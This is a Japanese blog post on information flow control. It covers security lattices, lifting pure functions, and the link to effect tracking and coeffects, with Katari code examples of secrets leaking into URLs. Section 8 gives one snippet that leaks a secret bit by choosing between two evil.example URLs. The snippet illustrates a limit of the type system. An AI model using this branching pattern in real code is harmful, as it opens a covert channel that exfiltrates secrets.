「この値は秘密だから、ログには出さない」「この文字列は URL に入れてはいけない」。
こういう規律は、たいていコードレビューと注意力で守られています。

これを型で守る方法があります。**情報フロー制御**という、40年ぐらい研究されている分野です。

この記事では、セキュリティレベルを型に載せる仕組みを、素朴なところから組み立てていきます。
そして途中で必ずぶつかる問題 —— **「関数をセキュリティレベルの数だけ書かなければならない」** ——
を解く鍵が、**その関数が純粋かどうか**である、という話をします。

「純粋関数はいいものだ」という話ではありません。
純粋性を型で追跡していないと、この仕組みは**実用にならない**、という話です。

最後に、これが Coeffect（Effect の双対）と呼ばれる型システムの一例であることを説明します。
Coeffect のセキュリティ応用は、日本語で読めるものがほとんど無いので、そこまで書きます。

---

## 1. なぜいま、この話をするのか

AI エージェントは、秘密を持って外に出ていきます。

API キー、OAuth トークン、ユーザーの個人情報。エージェントはツールを呼び、
外部 API を叩き、LLM にコンテキストを送ります。
**秘密が外に出る経路が、構造的にたくさんある**わけです。

そして今のところ、対処のほとんどは「気をつける」です。
システムプロンプトで釘を刺す、ガードレールで実行時にフィルタする、出力を正規表現で検査する。
どれも有用ですが、**どれも best-effort で、保証がありません。**

一方で「機密データが低機密の出口へ流れないことを保証する」という問題は、
**まったく新しくありません。** Denning が束モデルを出したのが 1976 年、
Volpano–Irvine–Smith が型システムとして健全性を示したのが 1996 年です。
Jif（Java）や LIO（Haskell）のような実装もあります。

エージェント界隈がゼロから悩んでいる問題に、PL 側にはすでに道具がある。
この記事はその道具の話です。エージェントの話はここまでにして、あとは一般論をやります。

## 2. セキュリティ束

まず、セキュリティレベルに順序を入れます。

```
private          ← 上位（より秘密）
   |
public           ← 下位（誰でも見てよい）
```

`public ⊑ private` と書きます。実際の系ではもっと段が増えます。
たとえば `public ⊑ internal ⊑ confidential ⊑ secret` のような一直線のもの、
あるいは「部門A だけが見てよい」「部門B だけが見てよい」「両方が見てよい」のような、
一直線にならない格子。

一般には、**束（lattice）** を仮定します。つまり任意の 2 つのレベルに対して

- **join** `ℓ₁ ⊔ ℓ₂` = 両方より上位で最小のレベル（上位に寄せる演算）
- **meet** `ℓ₁ ⊓ ℓ₂` = 両方より下位で最大のレベル（下位に寄せる演算）

が定まっているとします。以降 `⊥ = public`（最下位）、`⊤ = private`（最上位）と書きます。

型には `T of ℓ` の形でレベルを載せます。`string of private` は「秘密の文字列」です。
`of` を省いたら `of public` と読むことにします。

---

## 3. ナイーブに考える：値は下へ流れてはいけない

規則はひとつだけです。

> **レベル `ℓ` の値は、レベル `ℓ'` を要求する場所に置ける。ただし `ℓ ⊑ ℓ'` のときに限る。**

`public` の値は `private` を要求する場所に置けます（秘密の場所に公開データを入れても、
何も漏れない）。逆はだめです。これは部分型付けとしてそのまま書けます。

```
public <: private
```

「値のレベルは上げてよいが、下げてはいけない」。単調性です。
そして**出口（sink）にレベルを宣言しておく**と、規則が仕事を始めます。

```katari
// ログは public な観測点である、と宣言する
agent log(message: string) -> null with io

let token: string of private = ...
log(message = token)   // ← 型エラー。private ⋢ public
```

これだけで「秘密をログに出した」がコンパイルエラーになります。
規則はひとつ、あとは束と、出口の宣言だけです。

## 4. 素朴にやると壊れる：`concat` を何本書くのか

ここで、文字列を連結する関数を考えます。

```
concat : (string, string) -> string
```

`concat` はレベルについて何と言うべきでしょうか。
直感的には、**両方 public なら結果は public であってほしいし、
どちらかが private なら結果は private であるべき**です。素直に書くとこうなります。

```
concat : (string of public,  string of public)  -> string of public
concat : (string of public,  string of private) -> string of private
concat : (string of private, string of public)  -> string of private
concat : (string of private, string of private) -> string of private
```

2 レベルで 4 本。束のノードが `n` 個なら、2 引数関数ひとつにつき `n²` 本です。
そして `concat` だけの話ではありません。`length`、`to_upper`、`split`、`json.parse`、
リストの `map`、あなたが今日書いた全部のユーティリティ関数がこうなります。

**この時点で、素朴な情報フロー制御は実用になりません。**
「便利じゃない」ではなく、標準ライブラリが書けません。

---

## 5. 持ち上げ（lift）

ここに、きれいな脱出路があります。

**関数が純粋なら**、レベルを 1 段だけ書いておけば、残りは全部自動的に出ます。

### 5.1 lift の形

純粋関数 `f` と、任意のレベル `P` について：

```
        f : (A of X, B of Y) -> C of Z            （純粋）
  ────────────────────────────────────────────────  lift_P
   lift_P(f) : (A of X⊔P, B of Y⊔P) -> C of Z⊔P
```

**引数も返り値も、まとめて `P` だけ上位に寄せる。** これだけです。

`concat : (string, string) -> string`（全部 public）を `P = private` で持ち上げると

```
lift_private(concat) : (string of private, string of private) -> string of private
```

が出ます。さらに `public <: private` があるので、
片方だけ public な値を持ち上げ版に渡すのは何の問題もありません。

つまり **`concat` は 1 本書けば十分**です。
`P` として「実引数のレベルの join」を選べば、最も精密な結果型が出ます。

```
concat(pub_str, sec_str)   -- P = public ⊔ private = private
                           -- ⇒ string of private
```

そして、これは先ほど手で並べた 4 本の表と**完全に一致します**。
`n²` 本の表は、1 本の宣言と持ち上げから導出できるものだった、ということです。

型システムの表面では、これは属性についての多相として現れます。
レベルを表す型変数を取れるようにすればいい。

```katari
// レベル P について多相な concat（1 本だけ書く）
agent concat[attribute P](a: string of P, b: string of P) -> string of P
```

### 5.2 なぜ健全なのか

直感はこうです。

> **純粋関数について気にすべきことは、返り値がどこで使われるか、それだけである。**

`lift_P(f)` の返り値は `Z ⊔ P`、つまり **`P` より下位の場所では観測されません**。
そして `f` は純粋なので、引数の情報が外に出る経路は返り値しかありません。
だから引数が `P` 以上の秘密であっても、その情報を見られるのは `P` 以上の場所だけです。漏れません。

これは非干渉性（noninterference）の主張で、ちゃんと定理として証明できる形のものです。

### 5.3 副作用があると壊れる

いま使った前提を、もう一度見てください。

> **引数の情報が外に出る経路は、返り値しかない。**

副作用のある関数では、これが成り立ちません。

```katari
agent shout(a: string, b: string) -> string with io {
  console.log(a)              // ← ここが public な観測点
  string.concat(a, b)
}
```

`shout` を `P = private` に持ち上げると、`shout` は private な `a` を受け取れるようになります。
そして中で `a` を public なログに書きます。**漏れます。**

持ち上げは、副作用のある関数に対しては健全ではありません。
内部にどんな観測点があるか、シグネチャからは分からないからです。

### 5.4 だから、純粋性を型で追跡する必要がある

ここが記事の芯です。

情報フロー制御を実用にするには、持ち上げが要る（5.1）。
持ち上げが健全なのは純粋関数に限る（5.3）。
したがって、**型システムは「この関数が純粋かどうか」を知っていなければならない。**

純粋性の追跡は、しばしば「副作用を分離するときれいですね」という美学の話として語られます。
そうではありません。**副作用を型で管理していないと、そもそもこの持ち上げ規則を書けない。**
純粋性は、セキュリティレベルの追跡が実用に耐えるための**前提条件**です。

Katari で言えば、エフェクト行がこれを担っています。`with io` が付いていない agent は純粋で、
持ち上げの対象になる。付いていれば、宣言されたレベルがそのまま効く。

## 6. 具体例：`url` と `body` は、なぜレベルが違うのか

持ち上げできる関数とできない関数の違いが、いちばん効いてくる例を挙げます。

Katari の HTTP プリミティブのシグネチャは、こうなっています。

```katari
external agent fetch(
  url:     string,                    // ← public のみ
  method:  string,                    // ← public のみ
  headers: record[string of private],  // ← 秘密を通す
  body:    string of private,          // ← 秘密を通す
) -> response with io
```

**なぜ `url` だけ public なのか。** URL が秘密でないデータだから、ではありません。
URL は、アクセスログ、プロキシ、CDN のキャッシュ、`Referer` ヘッダに載ります。
つまり **URL という位置は、public なレベルの観測点**です。

一方 `headers` と `body` は、プログラムが名指しした宛先サーバーにだけ届きます。
**意図的な提出面**です。だから秘密を通してよい。

```katari
let token: string of private = credentials.resolve(source = ...)

// OK — 提出面
http.fetch(
  url = "https://api.example.com/v1/me",
  method = "GET",
  headers = record.of("Authorization", f"Bearer ${token}"),
  body = "",
)

// コンパイルエラー（K3001）— 漏出面
http.fetch(
  url = f"https://api.example.com/v1/me?access_token=${token}",
  method = "GET",
  headers = record.empty(),
  body = "",
)
```

同じ 1 個のトークンが、置く場所によって通ったり弾かれたりします。
これは実行時チェックではなく、型検査です。

さて、ここで 5 節の話に戻ります。

**もし `fetch` を持ち上げられてしまったら、この設計は一瞬で崩壊します。**
`lift_private(fetch)` の `url` は `public ⊔ private = private` になり、
秘密を URL に入れられるようになるからです。

つまり、引数に付いたレベル注釈には**二通りの読み方**があります。

|          | 純粋関数の引数レベル                       | 副作用つき関数の引数レベル         |
| -------- | ------------------------------------------ | ---------------------------------- |
| 意味     | ここに来たデータの**由来**。返り値へ流れる | この位置が**どのレベルの観測点か** |
| 持ち上げ | できる                                     | **できない**                       |

同じ `of private` という記法が、純粋かどうかで意味を変えます。
そして両者を区別できる情報は、エフェクト行にしかありません。

**エフェクトの追跡は、セキュリティレベルの追跡の付属品ではなく、その土台です。**

## 7. Katari の現状

僕が作っている [Katari](https://katari-lang.dev) では、v0.1 の時点で入っているのは
**`public` / `private` の 2 段だけ**です。上で書いた一般の束ではありません。

入っているもの：

- 値の型に載る privacy 属性（`T of private`）と、`public <: private` の部分型
- 提出面（HTTP ヘッダ値 / body）だけが秘密を通す規則。漏出面（URL）に入れると **K3001**
- 属性についての多相（持ち上げに相当するもの）
- transport 境界のただ 1 箇所での剥がし（`reveal`）

入っていないもの：

- **一般の束**。ユーザー定義のレベル、多段、非全順序
- **明示的な declassify**。いまは「HTTP レスポンスは public」のように、
  境界ごとに宣言的に決め打ちされています
- **暗黙のフロー**（次節）

2 段しかない束は、束としてはいちばんつまらないものですが、
規則の形はそのままです。段を増やす作業は、この記事に書いた構造の上に乗ります。

## 8. 何が防げて、何が防げないか

ここを書かないと、この手の話は嘘になります。

### 防げるもの

明示的なデータフローです。秘密が変数を伝って、公開の出口に到達する経路。
実務で起きる漏洩のかなりの部分はここです。**しかも型検査なので、テストが要りません。**

### 防げないもの

**暗黙のフロー（implicit flow）。** 制御フロー経由の漏洩です。

```katari
if (secret_flag) {
  http.fetch(url = "https://evil.example/a", ...)
} else {
  http.fetch(url = "https://evil.example/b", ...)
}
```

秘密の値そのものはどこにも渡っていませんが、どちらの URL が叩かれたかで 1 ビット漏れます。
これを止めるには、分岐の条件が持つレベルを実行文脈のレベル（pc ラベル）として伝播させる必要があります。
Katari v0.1 は値に付く taint として扱っているので、ここは追っていません。

**declassify した先。** 秘密を LLM に送るのは提出面なので通ります。
しかし LLM の応答は public として戻ってきます。
**モデルが秘密を要約して吐き出したら、そこにレベルは付いていません。**
型は「秘密がどこへ出て行けるか」を縛りますが、**出て行った先で何が起きるかは縛りません。**

**タイミングと停止性。** 秘密の値によって実行時間や停止するかどうかが変わると、そこから漏れます。
これは termination-insensitive な非干渉性と呼ばれる、この種の体系の標準的な限界です。

**人間。** 画面に出た秘密を人が別の場所に貼ったら、型は何もしません。

要するに、**型が保証するのはプログラムの中のデータフローだけ**です。
それは弱い保証ではなく、範囲がはっきりしているという意味で、むしろ強い保証です。
best-effort との違いはそこにあります。

## 9. 発展：これは Coeffect の一例である

ここまでの構造を、もう一度眺めてみます。

- セキュリティレベルの集合があって、**順序** `⊑` が入っている
- **join** `⊔` で上位に寄せる（持ち上げ、複数の入力の合流）
- **meet** `⊓` で下位に寄せる（この記事では表に出ませんでしたが、たとえば
  引数のレベルを推論するときに要ります。ある変数が複数の場所で使われるなら、
  そのすべてのレベルの meet 以下でなければならない）

分配束は、join を `+`、meet を `×` と見れば**冪等可換半環**になります（双対に取ることもできます）。
そこに `⊑` という順序が乗っているので、全体としては **順序付き半環（ordered semiring）** です。

そして、**任意の順序付き半環を型で追跡できるようにした体系**が、**Coeffect** です。

判断は、変数ごとにグレードが付いた形になります。

```
x :_r A ⊢ e : B
```

「`e` は `x` を `r` という量／様態で使う」。変数を 2 回使えばグレードは `+` で合流し、
関数適用のように文脈が入れ子になればグレードは `×` で合成されます。順序 `⊑` で緩められます。

半環を差し替えると、追跡できるものが変わります。

| 半環                   | 追跡できるもの                                                                                     |
| ---------------------- | -------------------------------------------------------------------------------------------------- |
| `(ℕ, +, ×, 0, 1)`      | **変数の使用回数**。線形型、有界線形論理                                                           |
| `{0, 1, ω}`            | 使わない／ちょうど 1 回／自由に使う                                                                |
| セキュリティ束         | **この記事の話**                                                                                   |
| エンドポイントの集合   | **変数がどのマシンに置かれているか**（分散・多層プログラミング）。これは僕の学士の研究テーマでした |
| `(ℕ, ...)`（別の読み） | リアクティブプログラミングで、**変数が何ターン後まで生き残るべきか**                               |

要するに Coeffect は、**リソースがどこに・どれだけ・どういう資格で置かれているか**を
柔軟に追跡するための枠組みです。セキュリティレベルは、そのうちのひとつの半環に過ぎません。

Effect が「計算が世界に及ぼすもの」を型に載せるのに対して、
Coeffect は「計算が文脈に要求するもの」を型に載せます。だから双対です。

そして、この記事の結論はきれいにここへ落ちます。

> **セキュリティレベルの追跡（Coeffect 側）が実用になるためには、
> 純粋性の追跡（Effect 側）が必要である。**

Effect と Coeffect を同時に扱う体系（graded な effect と coeffect の組み合わせ）が
研究されているのは、こういう理由です。片方だけでは足りない実例が、ちゃんとあるわけです。

Coeffect そのものについては、去年の関数型まつりで話しました：
[Effect の双対、Coeffect](https://speakerdeck.com/yukikurage/effect-noshuang-dui-coeffect)

なお、Katari の privacy 属性は、厳密には Coeffect そのものではありません。
グレードが文脈（変数の使用）ではなく**値の型**に付いているので、
graded comonad というより、レベル付きの型と部分型付けに近い形です。Coeffect の変形版、という位置づけです。

---

## 10. まとめ

- セキュリティレベルを束にして、値のレベルを型に載せ、出口のレベルを宣言する。
  これだけで「秘密が公開の出口に届く」がコンパイルエラーになる
- 素朴にやると、関数を束のノード数の 2 乗だけ書く羽目になって実用にならない
- **純粋関数なら持ち上げができる。** 引数と返り値をまとめて上位に寄せてよい。
  1 本書けば全レベル分が出る
- 持ち上げが健全なのは、「引数の情報は返り値経由でしか出ない」からで、
  **副作用のある関数では成り立たない**
- したがって、**情報フロー制御を実用にするには、エフェクトの追跡が前提条件になる**
- これは順序付き半環をグレードに取る Coeffect 系の一例で、
  半環を差し替えれば使用回数・配置・生存期間なども同じ枠組みで追跡できる

秘密の扱いは、注意力ではなく型で守れます。
そして型で守るためには、副作用も型で管理していなければならない、という話でした。
